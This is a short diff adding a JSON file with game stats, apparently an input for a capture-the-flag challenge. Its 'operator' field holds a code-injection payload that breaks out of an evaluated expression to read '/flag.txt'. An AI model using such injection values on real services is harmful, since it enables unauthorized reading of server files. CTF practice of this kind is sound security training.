@@ -1,0 +1,5 @@
+{
+  "current_health": "100",
+  "attack_power": "10",
+  "operator": ";f=open('/flag.txt','r');result=f.readlines();x="
+}
